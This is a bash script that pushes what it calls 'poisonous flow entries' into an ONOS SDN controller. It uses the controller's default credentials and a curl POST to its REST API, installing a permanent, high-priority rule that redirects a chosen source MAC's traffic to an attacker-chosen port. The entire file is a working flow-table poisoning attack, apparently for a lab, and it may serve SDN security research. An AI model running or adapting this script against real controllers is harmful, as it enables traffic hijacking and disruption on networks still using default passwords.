#!/bin/bash
echo "pushing poisonous flow entries to switch $1, ether_src $2, output $3 with priority $4"
curl -u onos:rocks -X POST "172.17.0.2:8181/onos/v1/flows/of:000000000000000$1" -H "content-type: application/json" -d '{
    "priority":'$4',
    "timeout":0,
    "isPermanent": true,
    "deviceId": "of:000000000000000'$1'",
    "treatment": {
      "instructions": [
        {
        "type": "OUTPUT",
	"port": "'$3'"
        }
      ]
    },
    "selector":{
      "criteria": [
        {
        "type": "ETH_SRC",
	"mac": "'$2'"
        }
      ]
    }

}'
